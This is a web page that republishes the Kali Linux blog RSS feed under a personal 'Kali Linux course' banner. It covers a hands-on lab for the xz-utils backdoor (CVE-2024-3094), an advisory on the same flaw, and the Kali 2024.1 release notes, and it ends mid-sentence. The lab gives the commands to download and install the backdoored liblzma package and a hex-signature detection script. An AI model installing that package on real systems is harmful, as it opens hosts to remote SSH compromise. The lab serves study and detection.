<html>
<head>
<title> asad kali linux coruse </title>
</head>
<body>
<b> My youtube channel name is Mr A viral3911 <please subscribe on my youtube channel fore more corses>  <rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:webfeeds="http://webfeeds.org/rss/1.0" version="2.0">
<channel>
<title>Kali Linux</title>
<link>https://www.kali.org/</link>
<description>Home of Kali Linux, an Advanced Penetration Testing Linux distribution used for Penetration Testing, Ethical Hacking and network security assessments.</description>
<language>en-us</language>
<copyright>© OffSec Services Limited 2024. All rights reserved.</copyright>
<lastBuildDate>Fri, 31 May 2024 00:00:00 +0000</lastBuildDate>
<atom:link href="https://www.kali.org/rss.xml" rel="self" type="application/rss+xml"/>
<webfeeds:cover image="https://www.kali.org/images/kali-logo.svg"/>
<webfeeds:icon>https://www.kali.org/images/favicon.svg</webfeeds:icon>
<webfeeds:logo>https://www.kali.org/images/favicon.svg</webfeeds:logo>
<webfeeds:related layout="card" target="browser"/>
<webfeeds:accentColor>367BF0</webfeeds:accentColor>
<item>
<title>xz-utils backdoor: how to get started</title>
<link>https://www.kali.org/blog/xz-backdoor-getting-started/</link>
<guid isPermaLink="true">https://www.kali.org/blog/xz-backdoor-getting-started/</guid>
<pubDate>Mon, 01 Apr 2024 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/xz-backdoor-getting-started/images/xz-backdoor-getting-started.jpg" type="image/jpg"/>
<description><p>Following the recent disclosure of a <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">backdoor in upstream xz/liblzma</a>, we are writing this &ldquo;get started&rdquo; kind of blog post. We will explain how to setup an environment with the backdoored version of liblzma, and then the first commands to run to validate that the backdoor is installed. All in all, it should just take a few minutes, and there&rsquo;s no learning curve, it&rsquo;s all very simple.</p> <p>This blog post is aimed at all the enthusiasts that are following the news as the events unfold, and who are eager to have their hands on the keyboard, running a few commands in a terminal rather than just reading about it. This is really beginner level, and we&rsquo;ll just reproduce the easiest findings that were reported in the initial disclosure. Nothing groundbreaking here, sorry ;)</p> <h2 id="setting-up-the-environment">Setting up the environment</h2> <p>First thing first: we&rsquo;re going to need a Virtual Machine (or VM for short). The fastest is probably to just download a pre-built image from the <a href="https://www.kali.org/get-kali/#kali-virtual-machines">Kali Linux download page</a>, either the <a href="https://www.kali.org/blog/kali-linux-2024-1-release/">current 2024.1 release</a> or the latest weekly image, at your preference.</p> <p>When the image is downloaded, let&rsquo;s start it. Don&rsquo;t know how? We have documentation for each type of image: <a href="https://www.kali.org/docs/virtualization/import-premade-virtualbox/">VirtualBox</a>, <a href="https://www.kali.org/docs/virtualization/import-premade-vmware/">VMware</a>, <a href="https://www.kali.org/docs/virtualization/import-premade-hyperv/">Hyper-V</a> and <a href="https://www.kali.org/docs/virtualization/import-premade-qemu/">QEMU</a>.</p> <p>Now our VM is up and running, so we&rsquo;re going to download and install a version of <code>liblzma</code> that contains the backdoor. Even though the package was pulled out of Linux distributions, it&rsquo;s still widely available on the Internet. For this how-to, we&rsquo;re going to get it from the <a href="https://snapshot.debian.org/">Debian snapshot service</a>. Since Kali is based on Debian, and liblzma only depends on the libc, it&rsquo;s Ok to install the Debian package in Kali, we shouldn&rsquo;t run into any incompatibility issue.</p> <p>A note for clarity: xz-utils is the name of the upstream repository, it provides the well-known command <code>xz</code> to compress and decompress files, but it also provides the library <code>liblzma</code> , which is the compromised library that everyone is talking about at the moment. And it is via this library that a backdoor gets added to the SSH daemon&hellip; Clear?</p> <p>The upstream versions <code>5.6.0</code> and <code>5.6.1</code> of xz-utils are known to contain the backdoor, so let&rsquo;s grab the Debian package <code>5.6.1-1</code>.</p> <p>Within the VM, let&rsquo;s open a terminal and get it with:</p> <pre><code class="language-console">kali@kali:~$ wget https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/liblzma5_5.6.1-1_amd64.deb </code></pre> <p>And now let&rsquo;s install the package:</p> <div class="notices info"> <p data-header="Info"> A word of caution for those who are not paying attention: below, we are purposefully installing a package that contains a backdoor! Obviously you are running those steps in a Virtual Machine, and this Virtual Machine is not exposed to the Internet. </p> </div> <pre><code class="language-console">kali@kali:~$ sudo apt-get install --allow-downgrades --yes ./liblzma5_5.6.1-1_amd64.deb </code></pre> <p>Next step is to start (or restart) the SSH daemon:</p> <pre><code class="language-console">kali@kali:~$ sudo systemctl restart ssh </code></pre> <p>What&rsquo;s next? Let&rsquo;s find out!</p> <h2 id="confirm-that-liblzma-is-compromised">Confirm that liblzma is compromised</h2> <p>First, we can detect if the version of liblzma contains the backdoor, thanks to a script from Vegard Nossum, that was <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">provided in the disclosure</a>.</p> <p>Let&rsquo;s create the script:</p> <pre><code class="language-console">kali@kali:~$ cat &lt;&lt; 'EOF' &gt; detect.sh #! /bin/bash set -eu # find path to liblzma used by sshd path=&quot;$(ldd $(which sshd) | grep liblzma | grep -o '/[^ ]*')&quot; # does it even exist? if [ &quot;$path&quot; == &quot;&quot; ] then echo probably not vulnerable exit fi # check for function signature if hexdump -ve '1/1 &quot;%.2x&quot;' &quot;$path&quot; | grep -q f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410 then echo probably vulnerable else echo probably not vulnerable fi EOF </code></pre> <p>Make it executable, and then run it:</p> <pre><code class="language-console">kali@kali:~$ chmod +x detect.sh kali@kali:~$ kali@kali:~$ ./detect.sh probably vulnerable </code></pre> <p>The output from the command above should be <code>probably vulnerable</code>, meaning that the backdoor was detected in the library.</p> <p>But wait, how does that work? The command <code>hexdump -ve '1/1 &quot;%.2x&quot;' &lt;&lt;file&gt;&gt;</code> will dump a file in hexadecimal form, without any formatting, just a looooong hexa string. The script does that with liblzma, and then matches a pattern (also in hexadecimal form) that belongs to the exploit. That&rsquo;s all there is to it, and it&rsquo;s enough to detect it.</p> <h2 id="confirm-that-the-ssh-daemon-is-slower-than-usual">Confirm that the SSH daemon is slower than usual</h2> <p>First, for this test we need to make sure that password authentication is disabled, in the settings of the SSH daemon:</p> <pre><code class="language-console">kali@kali:~$ sudo sed -E -i 's/^#?PasswordAuthentication .*/PasswordAuthentication no/' /etc/ssh/sshd_config </code></pre> <p>Then restart the daemon:</p> <pre><code class="language-console">kali@kali:~$ sudo systemctl restart ssh </code></pre> <p>And now, let&rsquo;s try to login as a non existant user, and time it:</p> <pre><code class="language-console">kali@kali:~$ time ssh nonexistant@localhost nonexistant@localhost: Permission denied (publickey). real 0.31s user 0.05s sys 0.00s cpu 17% </code></pre> <p>There&rsquo;s no &ldquo;right value&rdquo; here, as it&rsquo;s highly dependent on your particular setup. However, what we want is to get an idea of how much time it takes, so let&rsquo;s run the command a couple of times, to make sure that the results are consistent. In my tests, results are indeed very consistent, I get <code>real 0.30s</code> almost all the time.</p> <p>Now let&rsquo;s re-install the non-backdoored version of liblzma:</p> <pre><code class="language-console">kali@kali:~$ sudo apt update &amp;&amp; sudo apt install --yes liblzma5 [...] Get:1 http://http.kali.org/kali kali-rolling/main amd64 liblzma5 amd64 5.6.1+really5.4.5-1 [240 kB] [...] </code></pre> <p>At the time of this writing, the version of the <code>lzma5</code> package in Kali rolling is <code>5.6.1+really5.4.5-1</code>, as shown above.</p> <p>Now, let&rsquo;s try the SSH login again, and time it:</p> <pre><code class="language-console">kali@kali:~$ time ssh nonexistant@localhost nonexistant@localhost: Permission denied (publickey). real 0.13s user 0.05s sys 0.00s cpu 41% </code></pre> <p>As we can see, the difference in timings is pretty clear, it&rsquo;s much faster without the backdoor!</p> <h2 id="acknowledgments">Acknowledgments</h2> <p>As said in the introduction, this blog post is nothing new, it&rsquo;s merely a step-by-step to reproduce some findings from the <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">original disclosure</a>. All the credits (massive credits actually) go to Andres Freund for the fantastic work and detailed report, and Vegard Nossum for the <code>detect.sh</code> script.</p></description>
</item>
<item>
<title>All about the xz-utils backdoor</title>
<link>https://www.kali.org/blog/about-the-xz-backdoor/</link>
<guid isPermaLink="true">https://www.kali.org/blog/about-the-xz-backdoor/</guid>
<pubDate>Fri, 29 Mar 2024 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/about-the-xz-backdoor/images/xz-utils.jpg" type="image/jpg"/>
<description> <div class="notices info"> <p data-header="Info"> As of 5:00 pm ET on March 29, 2024 the following information is accurate. Should there be updates to this situation, they will be edited onto this blog post. </p> </div> <p>The <a href="https://pkg.kali.org/pkg/xz-utils">xz-utils package</a>, starting from versions 5.6.0 to 5.6.1, was found to <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3094">contain a backdoor (CVE-2024-3094)</a>. This backdoor could potentially allow a malicious actor to compromise sshd authentication, granting unauthorized access to the entire system remotely.</p> <p>With a library this widely used, the severity of this vulnerability poses a threat to the entire Linux ecosystem. Luckily, this issue was caught quickly so the impact was significantly less than it could have been. It has already been patched in Debian, and therefore, Kali Linux.</p> <p>The impact of this vulnerability affected Kali between March 26th to March 29th, during which time <a href="https://pkg.kali.org/news/578094/xz-utils-560-02-imported-into-kali-rolling/">xz-utils 5.6.0-0.2</a> was available. If you updated your Kali installation on or after March 26th, but before March 29th, it is crucial to apply the latest updates today to address this issue. However, if you did not update your Kali installation before the 26th, you are not affected by this backdoor vulnerability.</p> <p><p> <a href='https://www.kali.org/blog/about-the-xz-backdoor/images/pkg-kali-xz-utils.png'> <img src="https://www.kali.org/blog/about-the-xz-backdoor/images/pkg-kali-xz-utils.png" alt="" /> </a> </p> </p> <p>Should you wish to check if you have the vulnerable version installed, we can perform the following command:</p> <pre><code>kali@kali:~$ apt-cache policy liblzma5 liblzma5:  Installed: 5.4.5-0.3  Candidate: 5.6.1+really5.4.5-1  Version table:     5.6.1+really5.4.5-1 500        500 http://kali.download/kali kali-rolling/main amd64 Packages *** 5.4.5-0.3 100        100 /var/lib/dpkg/status </code></pre> <p>If we see the version <code>5.6.0-0.2</code> next to <strong>Installed:</strong> then we <em>must</em> upgrade to the latest version, <code>5.6.1+really5.4.5-1</code>. We can do this with the following commands:</p> <pre><code>kali@kali:~$ sudo apt update &amp;&amp; sudo apt install -y --only-upgrade liblzma5 ... kali@kali:~$ </code></pre> <p>More information can be found at <a href="https://www.helpnetsecurity.com/2024/03/29/cve-2024-3094-linux-backdoor/">Help Net Security</a> for a summarized post on the details of the vulnerability, <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">Openwall</a> for the initial disclosure, and <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3094">NIST&rsquo;s NVD</a> entry for this vulnerability.</p></description>
</item>
<item>
<title>Kali Linux 2024.1 Release (Micro Mirror)</title>
<link>https://www.kali.org/blog/kali-linux-2024-1-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2024-1-release/</guid>
<pubDate>Wed, 28 Feb 2024 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-linux-2024-1-release/images/banner-2024.1-release.jpg" type="image/jpg"/>
<description><p>Hello 2024! Today we are unveiling <strong>Kali Linux 2024.1</strong>. As this is our the first <a href="https://www.kali.org/releases/">release</a> of the year, it does include new visual elements! Along with this we also have some exciting new mirrors to talk about, and of course some package changes - both new tools and upgrades to existing ones. If you want to see the new theme for yourself and maybe try out one of those new mirrors, <a href="https://www.kali.org/get-kali/">download a new image</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">upgrade <em>if you have an existing Kali Linux installation</em></a>.</p> <p>The summary of the <a href="https://bugs.kali.org/changelog_page.php">changelog</a> since the <a href="https://www.kali.org/blog/kali-linux-2023-4-release/">2023.4 release from December</a> is:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2024-1-release/#introducing-the-micro-mirror-free-software-cdn">Micro Mirror Free Software CDN</a></strong> - FCIX Software Mirror reached out offering to host our images, and we said yes</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2024-1-release/#2024-theme-refresh">2024 Theme Refresh</a></strong> - Our yearly theme refresh with all new wallpapers and GRUB theme</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2024-1-release/#other-desktop-changes">Other Desktop Environment Changes</a></strong> - A few new tweaks to our default environments</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2024-1-release/#kali-nethunter-updates">NetHunter Updates</a></strong> - NetHunter Rootless for Android 14, Bad Bluetooth HID attacks, and other updates</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2024-1-release/#new-tools-in-kali">New Tools</a></strong> - As always, various new shiny tools!</li> </ul> <hr> <h2 id="introducing-the-micro-mirror-free-software-cdn">Introducing the Micro Mirror Free Software CDN</h2> <p>With this latest release of Kali Linux, our network of <a href="https://http.kali.org/README?mirrorlist">community mirrors</a> grew much stronger, thanks to the help of the Micro Mirror CDN! Here&rsquo;s the story.</p> <p>Last month we replied to a long-forgotten email from Kenneth Finnegan from the <a href="https://mirror.fcix.net/">FCIX Software Mirror</a>. The FCIX is a rather big mirror located in California, and they reached out to offer to host the Kali images on their mirror. To which we answered yes please, and that was it; shortly after, the <a href="https://mirror.fcix.net/kali-images/">Kali images were added to the FCIX mirror</a>. So far so good, and it could have been the end of the story, but then Kenneth followed up:</p> <blockquote> <p>We&rsquo;re now also operating another 32 other mirrors which are optimized for minimal storage and hosting only the highest traffic projects [&hellip;] Would the Kali project be willing to accept ten additional mirrors from the FCIX organization?</p> </blockquote> <p>Wow, <strong>10 additional mirrors</strong>, that sounds very nice indeed! But, wait, <em><strong>32 mirrors</strong></em>??? How come? Where do all those mirrors come from? That was intriguing. As it turns out, Kenneth operates a network of mirrors, which was officially announced back in May 2023 on his blog: <a href="https://blog.thelifeofkenneth.com/2023/05/building-micro-mirror-free-software-cdn.html">Building the Micro Mirror Free Software CDN</a>. For anyone interested in Internet infrastructure, we encourage you to read it, that&rsquo;s a well-written blog post right there, waiting for you.</p> <p>So what is the Micro Mirror CDN exactly? One-liner: a network of mirrors dedicated to serving Linux and Free Software. <strong>Contrary to traditional mirrors that host around 50TB of project files, Micro Mirrors are machines with &ldquo;only&rdquo; a few TB of storage</strong>, that focus on hosting only the most high-demand projects. In other words: <strong>they provide additional bandwidth where it&rsquo;s needed the most</strong>. Another important difference with traditional mirrors is that those machines are not managed by the sponsor (the organization that funds the mirror). Usually, a sponsor provides the bandwidth, the mirror, and also administrates it. While here, the sponsor only provides the bandwidth, and it&rsquo;s the FCIX Micro Mirror team that does everything else: buy the hardware, ship it to the data-center, and then manage it remotely via their <a href="https://github.com/PhirePhly/micromirrors">public Ansible playbook</a>.</p> <p>For anyone familiar with mirroring, it&rsquo;s quite exciting to see such a project taking shape. Free software and Linux distributions have been distributed thanks to community-supported mirrors <a href="http://www.ibiblio.org/pub/historic-linux/distributions/debian-0.91/debian-0.91/RELEASE-0.91">for almost three decades now</a>, it&rsquo;s a long tradition. It&rsquo;s true that we&rsquo;ve seen some changes over the last years, and these days some of the biggest FOSS projects <a href="https://news.apache.org/foundation/entry/apache-software-foundation-moves-to">are entirely distributed via a CDN</a>, leaving behind the mirroring system. For Kali Linux we use a mixed approach: it is distributed in part thanks to 50+ mirrors across the world, and in part thanks to the Cloudflare CDN that acts as a ubiquitous mirror. We are lucky to benefit from a <a href="https://blog.cloudflare.com/cloudflare-repositories-ftw">very generous sponsorship from Cloudflare</a> since 2019. But smaller or newer projects don&rsquo;t get this chance, thus community mirrors are still essential to free software distribution. That&rsquo;s why it&rsquo;s nice to see a project like the Micro Mirror CDN, it&rsquo;s a novel approach in the field of mirroring, and with Kali Linux we are very grateful to be part of the journey.</p> <p>For any organization out there that has spare bandwidth and wants to support free software, the Micro Mirror project might be something you are interested in. You might want to look at their <a href="https://github.com/PhirePhly/micromirrors/blob/main/doc/product-brief.md">product brief</a> for a more thorough description of the service, and email <code>mirror at fcix dot net</code> for more information. we&rsquo;ll just quote one line that summarize it really well:</p> <blockquote> <p>From the hosting sponsor&rsquo;s perspective, the Micro Mirror is a turnkey appliance, where they only need to provide network connectivity and remote hands to install the hardware, where all sysadmin and monitor work is handled by the FCIX team with the economy of scale on our side.</p> </blockquote> <p>A big thanks to the FCIX team, and Kenneth Finnegan in particular, for their generous offer. Thanks to their help, the Kali images are now served from ten additional mirrors: <strong>seven in the US, one in Colombia, one in the UK and one in Australia</strong>.</p> <p>And while we are talking about mirrors: we also got plenty of new mirrors from various sponsors during this release cycle, check the <a href="https://www.kali.org/blog/kali-linux-2024-1-release/#new-kali-mirrors">dedicated section below</a> for details.</p> <h2 id="2024-theme-refresh">2024 Theme Refresh</h2> <p>As for previous 20**.1 releases, <strong>this update brings with it our annual theme refresh</strong>, a tradition that keeps our interface as cutting-edge as our tools. This year marks the unveiling of our newest theme, meticulously crafted to enhance user experience from the moment you boot up. With significant <strong>updates to the boot menu, login display, and an array of captivating desktop wallpapers, for both our regular Kali and Kali Purple editions</strong>. We are dedicated to not only advancing our cybersecurity capabilities but also ensuring that the aesthetic appeal of our platform matches the power within.</p> <p><strong>Boot menu</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2024-1-release/images/boot-menu.png'> <img src="https://www.kali.org/blog/kali-linux-2024-1-release/images/boot-menu.png" alt="" /> </a> </p> </p> <p><strong>Login display</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2024-1-release/images/login.png'> <img src="https://www.kali.org/blog/kali-linux-2024-1-release/images/login.png" alt="" /> </a> </p> </p> <p><strong>Desktop</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2024-1-release/images/desktop.png'> <img src="https://www.kali.org/blog/kali-linux-2024-1-release/images/desktop.png" alt="" /> </a> </p> </p> <p><strong>Kali-Purple desktop</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2024-1-release/images/desktop-purple.png'> <img src="https://www.kali.org/blog/kali-linux-2024-1-release/images/desktop-purple.png" alt="" /> </a> </p> </p> <p><strong>New wallpapers</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2024-1-release/images/wallpapers.png'> <img src="https://www.kali.org/blog/kali-linux-2024-1-release/images/wallpapers.png" alt="" /> </a> </p> </p> <p>Special thanks to <strong><a href="https://twitter.com/arszilla">@arszilla</a></strong> for not only suggesting two wallpaper variants but also contributing to the creation of one of the default wallpapers featured in this release. These additional images were crafted to complement the background colors of the Nord and Dracula color schemes. To access these wallpapers, simply install the <code>kali-community-wallpapers</code> package, which also offer many other stunning backgrounds created by our community contributors.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2024-1-release/images/dracula-nord-wallpapers.png'> <img src="https://www.kali.org/blog/kali-linux-2024-1-release/images/dracula-nord-wallpapers.png" alt="" /> </a> </p> </p> <h2 id="other-desktop-changes">Other desktop changes</h2> <h3 id="xfce">Xfce</h3> <p>We are excited to introduce a convenient enhancement to our Xfce desktop. Now, users can <strong>effortlessly copy their VPN IP address to the clipboard with just a click</strong>, simplifying the workflow and enhancing productivity for our users. To take advantage of this functionality, ensure that <code>xclip</code> is installed on your system (<code>sudo apt update &amp;&amp; sudo apt -y install xclip</code>). With this improvement, managing your VPN connections on Kali Linux becomes even more seamless and intuitive.</p> <p>Thank you <strong><a href="https://gitlab.com/lucas.parsy">@lucas.parsy</a></strong> for your contribution that made this feature possible!</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2024-1-release/images/vpn-plugin.png'> <img src="https://www.kali.org/blog/kali-linux-2024-1-release/images/vpn-plugin.png" alt="" /> </a> </p> </p> <p><strong>Other Xfce changes</strong>:</p> <ul> <li>Kali-undercover updated to fix compatibility with latest Xfce</li> <li>Fixed a bug with <code>xfce-panel</code> and Kali&rsquo;s customized <code>cpugraph</code> plug-in</li> </ul> <h3 id="gnome-shell">Gnome-Shell</h3> <p>For Gnome desktop one notable change is the <strong>replacement of the <code>eye-of-gnome (eog)</code> image viewer with <code>Loupe</code></strong>, continuing the transition to GTK4 based applications. Additionally, the <strong>latest update of Nautilus file manager</strong> arrived to Kali&rsquo;s repositories, delivering a significant boost in file search speed and introducing a refreshed sidebar design.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2024-1-release/images/gnome.png'> <img src="https://www.kali.org/blog/kali-linux-2024-1-release/images/gnome.png" alt="" /> </a> </p> </p> <h3 id="icon-theme">Icon Theme</h3> <p>Following with the desktop enhancements, we&rsquo;ve added a <strong>few new app icons</strong>, ensuring a fully themed experience for default installations of Kali Linux. Additionally, we&rsquo;ve refreshed our icon theme with <strong>new symbolic icons</strong>, enhancing consistency system-wide.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2024-1-release/images/icons.png'> <img src="https://www.kali.org/blog/kali-linux-2024-1-release/images/icons.png" alt="" /> </a> </p> </p> <h2 id="kali-nethunter-updates">Kali NetHunter Updates</h2> <p><p> <a href='https://www.kali.org/blog/kali-linux-2024-1-release/images/NetHunter-S24Ultra.png'> <img src="https://www.kali.org/blog/kali-linux-2024-1-release/images/NetHunter-S24Ultra.png" alt="" /> </a> </p> </p> <p>We finally got our hands on a brand new Samsung Galaxy S24 Ultra and yes!, <a href="https://www.kali.org/docs/nethunter/nethunter-rootless/">NetHunter rootless</a> runs like a dream. Fortunately, Android 14 lets us disable child process restrictions in developer settings so we no longer have to use the adb command line to enable <a href="https://www.kali.org/docs/nethunter/nethunter-kex-manager/">KeX support</a>. We have updated our <a href="https://www.kali.org/docs/nethunter/nethunter-rootless/">documentation</a> to reflect these changes.</p> <hr> <p><a href="https://twitter.com/yesimxev">@yesimxev</a> managed to add the popular Bad Bluetooth HID attack the the NetHunter app for both phones and even smartwatches!</p> <video class="video-shortcode" preload="metadata" controls> <source src="https://www.kali.org/blog/kali-linux-2024-1-release/videos/nethunter-badbt-proto.mp4" > Your browser does not support the video tag. </video> <hr> <p>The icons for our NetHunter and NHTerm apps have received a makeover and <a href="https://twitter.com/kimocoder">@kimocoder</a> &amp; <a href="https://twitter.com/martindatoss">@martinvlba</a> spent countless days updating the codebase to ensure compatibility with the latest Android version.</p> <hr> <p>The community engagement is at an all time high, which is reflected by the following <a href="https://stats.nethunter.com/kernels.html">new kernels</a>:</p> <ul> <li>Realme C15</li> <li>TicWatch Pro 3</li> <li>(Updated) Samsung Galaxy S9+</li> <li>Xiaomi Poco X3 NFC</li> </ul> <p>Thanks heaps to everyone that <a href="https://www.kali.org/docs/community/contribute/">contributed</a>, we wouldn&rsquo;t be here without you!</p> <p><em>Stay tuned as there are many more kernels already on the way!</em></p> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>The following new tools made it into this Kali release <em>(via the network repositories)</em>:</p> <ul> <li><a href="https://www.kali.org/tools/blue-hydra/">blue-hydra</a> - Bluetooth device discovery service</li> <li><a href="https://www.kali.org/tools/opentaxii/">opentaxii</a> - TAXII server implementation from EclecticIQ</li> <li><a href="https://www.kali.org/tools/readpe/">readpe</a> - Command-line tools to manipulate Windows PE files</li> <li><a href="https://www.kali.org/tools/snort/">snort</a> - Flexible Network Intrusion Detection System</li> </ul> <p><em>The focus was adding new libraries this release, and there is always numerous packages updates. Plus we also bump the Kali kernel to 6.6!</em></p> <h3 id="community-packages">Community Packages</h3> <p>There has also been a tool submitted from the community which has been merged into Kali:</p> <ul> <li><a href="https://www.kali.org/tools/above/">above</a> - Invisible protocol sniffer for finding vulnerabilities in the network</li> </ul> <p><em>If you are wanting a tool in Kali quicker than what we can add, please see <a href="https://www.kali.org/blog/kali-linux-2023-3-release/#rekono---community-package-submission">our blog post from a previous release</a>.</em></p> <h2 id="miscellaneous">Miscellaneous</h2> <p>Below are a few other things which have been updated in Kali, which we are calling out which do not have as much detail:</p> <ul> <li>Due to the ongoing <code>/usr-merge</code> transition in Debian, using 2023.4 or older versions of <a href="https://www.kali.org/docs/installation/network-pxe/#download-kali-pxe-netboot-images">our netboot images</a> will no longer work. Make sure to either grab weekly image or Kali 2024.1! </li> <li>Friendly reminder, if you are getting &ldquo;weird special characters&rdquo; when trying to use keyboard shortcuts to copy/paste clipboard, the default is to use &ldquo;<strong>ctrl</strong>+<strong>shift</strong>+<strong>c</strong>&rdquo; and &ldquo;<strong>ctrl</strong>+<strong>shift</strong>+<strong>v</strong>&rdquo;. <ul> <li><em><strong>ctrl</strong>+<strong>c</strong> (without shift) in Unix is used to kill programs!</em></li> <li>Should you wish, you can alter the default behaviour in your favourite terminal program</li> </ul> </li> </ul> <h2 id="kali-website-updates">Kali Website Updates</h2> <h3 id="kali-documentation">Kali Documentation</h3> <p>Our <a href="https://www.kali.org/docs/">Kali documentation</a> has had various updates:</p> <ul> <li><a href="https://www.kali.org/docs/virtualization/install-vmware-silicon-host/">Installing VMware on Apple Silicon (M1/M2/M3) Macs (Host)</a> (updated)</li> <li><a href="https://www.kali.org/docs/installation/installation-sizes/">Kali Installation Sizes</a> (updated)</li> </ul> <p><em>A way to make a project even stronger is to help its <a href="https://www.kali.org/docs/">documentation</a>. Kali is no exception. If you are able to please do <a href="https://www.kali.org/docs/community/contribute/">contributed</a>.</em></p> <h3 id="tool-documentation">Tool Documentation</h3> <p>Our <a href="https://www.kali.org/tools/">tool documentation</a> is always getting various updates from us, but we received a great contribution from <a href="https://gitlab.com/etd">Daniel</a>:</p> <ul> <li><a href="https://www.kali.org/tools/dradis/">Dradis</a></li> </ul> <p><em>If you are wanting to help Kali, and give back, submitting to <a href="https://www.kali.org/tools/">kali.org/tools</a> is a great way to <a href="https://www.kali.org/docs/community/contribute/">contributed</a>.</em></p> <h3 id="kali-blog-recap">Kali Blog Recap</h3> <p>Since our last release, we did the following <a href="https://www.kali.org/blog/">blog posts</a>:</p> <ul> <li><a href="https://www.kali.org/blog/non-free-firmware-transition/">The great non-free-firmware transition</a></li> <li><a href="https://www.kali.org/blog/dei-promise/">Kali Linux DEI Promise</a></li> </ul> <h2 id="community-shout-outs">Community Shout-Outs</h2> <p>These are <strong>people from the public who have helped Kali</strong> and the team for the last release. And we want to praise them for their work <em>(we like to give credit where due!)</em>:</p> <ul> <li><a href="https://gitlab.com/Arszilla">Arszilla</a></li> <li><a href="https://gitlab.com/casterbyte">Caster</a></li> <li><a href="https://gitlab.com/etd">Daniel</a></li> <li><a href="https://gitlab.com/janerysavy17">Jane Rysavy</a></li> <li><a href="https://gitlab.com/Fetti.Wop">Jordan</a></li> <li><a href="https://gitlab.com/lucas.parsy">Lucas Parsy</a></li> <li><a href="https://gitlab.com/ronbo">ronbo</a></li> </ul> <p><em>Anyone can help out, anyone can get <a href="https://www.kali.org/docs/community/contribute/">involved</a>!</em></p> <h3 id="new-kali-mirrors">New Kali Mirrors</h3> <p>We have some new mirrors! Plenty of new mirrors, in fact. The last quarter was quite incredible on this front, and now is the time to give credits.</p> <p>Let&rsquo;s start with North America:</p> <ul> <li><strong>US</strong>: <a href="http://mirror.fcix.net/kali-images/">mirror.fcix.net</a> sponsored by FCIX aka. the <a href="https://fcix.net/">Fremont Cabal Internet Exchange</a>. Thanks to <em>Kenneth</em> Finnegan for reaching out&hellip; one and a half year ago! Thankfully we rediscovered the email and that was worth it.</li> <li><strong>Canada</strong>: <a href="http://mirror.xenyth.net/kali-images/">mirror.xenyth.net</a> sponsored by <a href="https://xenyth.net/">Xenyth Cloud</a>, and thanks to Sepehr Ahmadi.</li> <li><strong>Canada</strong>: <a href="http://mirror.quantum5.ca/kali-images/">mirror.quantum5.ca</a> sponsored by <a href="https://dynamicquantum.net">Dynamic Quantum Networks</a>, and thanks to Guanzhong Chen.</li> <li><strong>Canada</strong>: <a href="http://mirror.accuris.ca/kali/">mirror.accuris.ca</a> sponsored by <a href="https://accuristechnologies.ca/">Accuris Technologies Ltd.</a>, thanks to Peter Potvin.</li> <li><strong>Canada</strong>: <a href="http://mirror.0xem.ma/kali/">mirror.0xem.ma</a> sponsored by <a href="https://0xem.ma/">Emma Ruby</a>.</li> </ul> <p>Now for the rest of the world:</p> <ul> <li><strong>Chile</strong>: <a href="http://elmirror.cl/kali/">elmirror.cl</a>, sponsored by <a href="https://elmirror.cl/">ElMirror</a>, and thanks to Jonathan Gutierrez, who also maintains the other Kali Linux mirror in Chile: <a href="https://mirror.ufro.cl/">mirror.ufro.cl</a>. As a reminder: we really lack mirrors in South America, any help would be welcome to help Kali reach this part of the world.</li> <li><strong>China</strong>: <a href="http://mirrors.ustc.edu.cn/kali/">mirrors.ustc.edu.cn</a>, sponsored by the USTC aka. the <a href="https://en.ustc.edu.cn/">University of Science and Technology of China</a>, and thanks to Keyu Tao.</li> <li><strong>France</strong>: <a href="http://mirror.johnnybegood.fr/kali/">mirror.johnnybegood.fr</a>, sponsored by the <a href="https://johnnybegood.fr/">Johnnybegood Society</a>.</li> <li><strong>Portugal</strong>: <a href="http://mirror.leitecastro.com/kali/">mirror.leitecastro.com</a>, sponsored by <a href="https://leitecastro.com/">Tomás Leite de Castro</a>.</li> <li><strong>South Korea</strong>: <a href="http://mirror.amuksa.com/kali/">mirror.amuksa.com</a>.</li> </ul> <p>On top of that, as said above, there is now the Micro Mirror CDN that serves Kali images via 10 points of presence: 7 in the US, 1 in Colombia, 1 in the UK and 1 in Australia!</p> <p>To wrap that up: THANK YOU to all of you, individuals and companies, who provide bandwidth and help us distribute Kali to everyone out there!</p> <p><em>If you have the disk space and bandwidth, <a href="https://www.kali.org/docs/community/setting-up-a-kali-linux-mirror/">we always welcome new mirrors</a>.</em></p> <hr> <h2 id="kali-team-discord-chat">Kali Team Discord Chat</h2> <p>Since the launch of <a href="https://discord.kali.org/">our Discord server</a> with <a href="https://www.kali.org/blog/kali-linux-2022-3-release/">Kali 2022.3</a>, we have been doing an hour long voice chat with a number of Kali team members. This is when anyone can ask questions (hopefully relating to Kali or the information security industry) to us.</p> <p>The next session will happen a little later than normal, <strong>Friday, 22nd March 2024 18:00 -&gt; 19:00 <a href="https://time.is/UTC">UTC/+0 GMT</a></strong>. It will once again 